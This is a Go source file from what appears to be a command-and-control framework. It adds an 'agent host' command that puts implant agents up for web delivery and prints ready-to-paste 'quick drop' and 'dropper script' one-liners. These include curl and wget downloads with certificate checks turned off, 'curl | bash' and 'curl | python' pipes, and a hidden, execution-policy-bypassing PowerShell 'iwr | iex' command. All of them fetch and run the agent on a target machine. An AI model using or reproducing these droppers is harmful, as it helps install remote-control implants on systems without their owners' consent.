package agentcmd

import (
	"fmt"
	"rscc/internal/common/constants"
	"rscc/internal/common/pprint"
	"rscc/internal/database/ent"
	"strings"

	"github.com/spf13/cobra"
)

var switchToggle bool

func (a *AgentCmd) newCmdHost() *cobra.Command {
	cmd := &cobra.Command{
		Use:     "host",
		Short:   "Host agent on a given URL (Web Delivery)",
		Example: "agent host [flags] <id> <url>",
		Aliases: []string{"h"},
		Args:    cobra.MinimumNArgs(1),
		RunE:    a.cmdHost,
	}
	cmd.Flags().BoolP("remove", "r", false, "remove url and stop hosting agent")
	cmd.Flags().BoolVarP(&switchToggle, "switch", "s", false, "toggle hosting agent (on/off)")
	cmd.Flags().BoolP("info", "i", false, "show agent hosting info")
	cmd.MarkFlagsMutuallyExclusive("remove", "switch")

	return cmd
}

func (a *AgentCmd) cmdHost(cmd *cobra.Command, args []string) error {
	id := args[0]
	if len(id) != constants.IDLength {
		return fmt.Errorf("invalid agent id: %s", id)
	}

	agent, err := a.db.GetAgentByID(cmd.Context(), id)
	if err != nil {
		if ent.IsNotFound(err) {
			return fmt.Errorf("agent '%s' not found", id)
		}
		return fmt.Errorf("failed to get agent: %w", err)
	}

	remove, err := cmd.Flags().GetBool("remove")
	if err != nil {
		return err
	}
	info, err := cmd.Flags().GetBool("info")
	if err != nil {
		return err
	}

	// Remove url
	if remove {
		if agent.URL == "" {
			return fmt.Errorf("agent is not hosted")
		}
		err = a.db.UpdateAgentURL(cmd.Context(), id, "")
		if err != nil {
			return fmt.Errorf("failed to remove agent url: %w", err)
		}

		err = a.db.UpdateAgentHosted(cmd.Context(), id, false)
		if err != nil {
			return fmt.Errorf("failed to stop hosting agent: %w", err)
		}

		err = a.db.ResetAgentDownloads(cmd.Context(), id)
		if err != nil {
			return fmt.Errorf("failed to reset agent downloads: %w", err)
		}

		cmd.Println(pprint.Success("Agent url removed"))
		return nil
	}

	// On/Off
	if switchToggle {
		if agent.URL == "" {
			cmd.Println(pprint.Error("Agent is not hosted"))
			return nil
		}

		if agent.Hosted {
			err = a.db.UpdateAgentHosted(cmd.Context(), id, false)
			if err != nil {
				return fmt.Errorf("failed to stop hosting agent: %w", err)
			}
			cmd.Println(pprint.Success("Agent hosting stopped"))
		} else {
			err = a.db.UpdateAgentHosted(cmd.Context(), id, true)
			if err != nil {
				return fmt.Errorf("failed to start hosting agent: %w", err)
			}
			cmd.Println(pprint.Success("Agent hosting started"))
		}
		return nil
	}

	// Info
	if info && agent.URL != "" {
		a.printInfo(cmd, agent, agent.URL)
		return nil
	}

	// Set url
	if len(args) < 2 {
		if agent.URL != "" {
			a.printInfo(cmd, agent, agent.URL)
			return nil
		}
		return fmt.Errorf("agent is not hosted")
	}

	url := args[1]
	if url == "" {
		return fmt.Errorf("url is required")
	}
	if url == "/" {
		return fmt.Errorf("url cannot be '/'")
	}
	if !strings.HasPrefix(url, "/") {
		url = "/" + url
	}

	err = a.db.UpdateAgentURL(cmd.Context(), id, url)
	if err != nil {
		if ent.IsConstraintError(err) {
			cmd.Println(pprint.Error("url already in use"))
			return nil
		}
		cmd.Println(pprint.Error("failed to update agent url: %v", err))
		return nil
	}

	err = a.db.ResetAgentDownloads(cmd.Context(), id)
	if err != nil {
		return fmt.Errorf("failed to reset agent downloads: %w", err)
	}

	a.printInfo(cmd, agent, url)

	return nil
}

func (a *AgentCmd) printInfo(cmd *cobra.Command, agent *ent.Agent, url string) {
	cmd.Println(pprint.Success("Agent '%s' hosted at %s.\n", agent.Name, pprint.Magenta.Render(a.addr)))
	if len(agent.Servers) > 1 {
		cmd.Println(pprint.Info("Download links (first agent server as example):"))
	} else {
		cmd.Println(pprint.Info("Download link:"))
	}
	cmd.Println(pprint.Magenta.PaddingLeft(4).Render("https://" + agent.Servers[0] + url))
	cmd.Println(pprint.Magenta.PaddingLeft(4).Render("http://" + agent.Servers[0] + url))
	cmd.Println()
	if len(agent.Servers) > 1 {
		cmd.Println(pprint.Info("Quick drop (first agent server as example):"))
	} else {
		cmd.Println(pprint.Info("Quick drop:"))
	}
	if agent.Os != "windows" {
		cmd.Println(pprint.Cyan.PaddingLeft(4).Render("curl -skOLJ https://" + agent.Servers[0] + url))
		cmd.Println(pprint.Cyan.PaddingLeft(4).Render("wget --no-check-certificate --content-disposition -q https://" + agent.Servers[0] + url))
	} else {
		cmd.Println(pprint.Cyan.PaddingLeft(4).Render("curl.exe -ksfO https://" + agent.Servers[0] + url))
		cmd.Println(pprint.Cyan.PaddingLeft(4).Render("$ProgressPreference='SilentlyContinue';iwr -useb -ur http://" + agent.Servers[0] + url + " -o " + agent.Name))
		cmd.Println(pprint.Cyan.PaddingLeft(4).Render("(New-Object Net.WebClient).DownloadFile('http://" + agent.Servers[0] + url + "','" + agent.Name + "')"))
	}
	cmd.Println()
	cmd.Println(pprint.Info("Dropper script:"))
	if agent.Os != "windows" {
		cmd.Println(pprint.Cyan.PaddingLeft(4).Render("curl -skLJ https://" + agent.Servers[0] + url + ".sh | bash"))
		cmd.Println(pprint.Cyan.PaddingLeft(4).Render("curl -skLJ https://" + agent.Servers[0] + url + ".py | python"))
	} else {
		cmd.Println(pprint.Cyan.PaddingLeft(4).Render("powershell.exe -nop -exec bypass -w hidden -c \"iwr -useb http://" + agent.Servers[0] + url + ".ps1 | iex\""))
	}
}
